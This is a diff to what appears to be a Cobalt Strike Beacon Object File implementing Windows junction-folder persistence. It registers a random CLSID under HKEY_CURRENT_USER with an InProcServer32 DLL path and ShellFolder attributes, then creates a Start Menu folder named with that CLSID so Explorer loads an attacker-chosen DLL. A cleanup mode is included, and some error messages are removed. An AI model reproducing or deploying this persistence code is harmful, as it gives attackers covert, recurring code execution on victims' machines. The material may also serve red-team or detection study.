@@ -31,6 +31,9 @@ WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExW(HKEY hKey, LPCWSTR  lpSubKey,
 WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetKeyValueW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData);
 WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyW(HKEY hKey, LPCWSTR lpSubKey);
 WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
+
+WINBASEAPI void WINAPI OLE32$CoTaskMemFree(LPVOID);
+
 #endif
 
 #ifdef ShortCutStartup
@@ -447,27 +450,34 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 {
 	LSTATUS status = -1;
 	HKEY phkResult = 0;
+	size_t len = 0;
 	BOOL success = TRUE;
-	WCHAR* startupPath = NULL;
+	WCHAR* pknownStartupPath = NULL;
 
 	UUID myuid;
 	RPC_WSTR uidstr;
 	HRESULT hRes;
+	wchar_t baseKeyPath[512] = {0};
+	wchar_t startupPath[MAX_PATH] = {0};
+
 	const GUID xFOLDERID_StartMenu = { 0x625B53C3, 0xAB48, 0x4EC1, { 0xBA, 0x1F, 0xA1, 0xEF, 0x41, 0x46, 0xFC, 0x19 } };
 
 	wchar_t pFullKeyPath[512] = L"Software\\Classes\\CLSID\\{";
 	wchar_t* inproc = L"}\\InProcServer32";
+	wchar_t* shellFlder = L"}\\ShellFolder";
 
 	//%APPDATA%\Microsoft\Windows\Start Menu
-	hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_StartMenu, 0, NULL, &startupPath);
+	hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_StartMenu, 0, NULL, &pknownStartupPath);
 	if (hRes != 0)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Could not find known folder ID\n");
 		return FALSE;
 	}
-
+	MSVCRT$wcscpy(startupPath, pknownStartupPath);
 	MSVCRT$wcscat(startupPath, L"\\Programs\\Accessories\\");
 	MSVCRT$wcscat(startupPath, folderName);
+
+	MSVCRT$wcscat(dllPath, L"\0");
 
 
 
@@ -477,6 +487,15 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 		RPCRT4$UuidCreate(&myuid);
 		RPCRT4$UuidToStringW(&myuid, &uidstr);
 		MSVCRT$wcscat(pFullKeyPath, uidstr);
+
+		//Save the base key with CLSID
+		MSVCRT$wcscpy(baseKeyPath, pFullKeyPath);
+
+		//add ShellFolder
+		MSVCRT$wcscat(baseKeyPath, shellFlder);
+		MSVCRT$wcscat(baseKeyPath, L"\0");
+
+		//add inprocserver
 		MSVCRT$wcscat(pFullKeyPath, inproc);
 		MSVCRT$wcscat(pFullKeyPath, L"\0");
 
@@ -485,26 +504,58 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 		MSVCRT$wcscat(startupPath, L"}");
 		MSVCRT$wcscat(startupPath, L"\0");
 
-		//Add new subkeys
+		//Add new CLSID key
 		status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, NULL);
 		if (0 != status)
 		{
-			BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyExW has failed\n");
 			success = FALSE;
 		}
+		//Add InProcServer keys
 		if (success)
 		{
 			WCHAR lpValueName[] = L"";
-			MSVCRT$wcscat(dllPath, L"\0");
-			size_t len = MSVCRT$wcslen(dllPath) * 2 + 1;
+			
+			len = MSVCRT$wcslen(dllPath) * 2 + 1;
 			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, lpValueName, REG_EXPAND_SZ, dllPath, (DWORD)len);
 			if (0 != status)
 			{
-				BeaconPrintf(CALLBACK_ERROR, "RegSetKeyValueW has failed\n");
 				ADVAPI32$RegCloseKey(phkResult);
 				success = FALSE;
 			}
 
+			WCHAR* model = L"ThreadingModel";
+			WCHAR* apartment = L"Apartment";
+			len = MSVCRT$wcslen(apartment) * 2 + 1;
+			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, model, REG_SZ, apartment, (DWORD)len);
+			if (0 != status)
+			{
+				ADVAPI32$RegCloseKey(phkResult);
+				success = FALSE;
+			}
+
+
+		}
+
+		//Add ShellFolder keys
+		if(success)
+		{
+
+			ADVAPI32$RegCloseKey(phkResult);
+			phkResult = 0;
+			status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, baseKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, NULL);
+			if (0 != status)
+			{
+				success = FALSE;
+			}
+			WCHAR* attributes = L"Attributes";
+			DWORD value = 4035969341;
+
+			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, baseKeyPath, attributes, REG_DWORD, (BYTE*)&value, sizeof(value));
+			if (0 != status)
+			{
+				ADVAPI32$RegCloseKey(phkResult);
+				success = FALSE;
+			}
 		}
 
 		if (success)
@@ -530,14 +581,12 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 	}
 	else if (clean == 1)
 	{
-
+		wchar_t shellKeyPath[512] = {0};
 		MSVCRT$wcscat(startupPath, L".{");
 		MSVCRT$wcscat(startupPath, CLSID);
 		MSVCRT$wcscat(startupPath, L"}");
 		MSVCRT$wcscat(startupPath, L"\0");
 		BeaconPrintf(CALLBACK_ERROR, "Trying to clean startup path %ls\n", startupPath);
-
-		wchar_t baseKeyPath[512] = {0};
 
 		MSVCRT$wcscat(pFullKeyPath, CLSID);
 	
@@ -546,10 +595,14 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 		MSVCRT$wcscat(baseKeyPath, L"}");
 		MSVCRT$wcscat(baseKeyPath, L"\0");
 
-		//Need this to delete subkey
+		//Need this to delete shell subkey
+		MSVCRT$wcscat(shellKeyPath, pFullKeyPath);
+		MSVCRT$wcscat(shellKeyPath, shellFlder);
+		MSVCRT$wcscat(shellKeyPath, L"\0");
+
+		//Need this to delete inproc subkey
 		MSVCRT$wcscat(pFullKeyPath, inproc);
 		MSVCRT$wcscat(pFullKeyPath, L"\0");
-		BeaconPrintf(CALLBACK_ERROR, "Trying to clean reg key %ls \n", pFullKeyPath);
 
 
 		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, pFullKeyPath);
@@ -562,6 +615,18 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 		{
 
 			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", pFullKeyPath);
+		}
+
+		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, shellKeyPath);
+		if (status)
+		{
+			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
+			success = FALSE;
+		}
+		else
+		{
+
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", shellKeyPath);
 		}
 
 
@@ -598,7 +663,7 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 
 	}
 
-
+	OLE32$CoTaskMemFree((LPVOID)pknownStartupPath);
 
 	return success;
 }
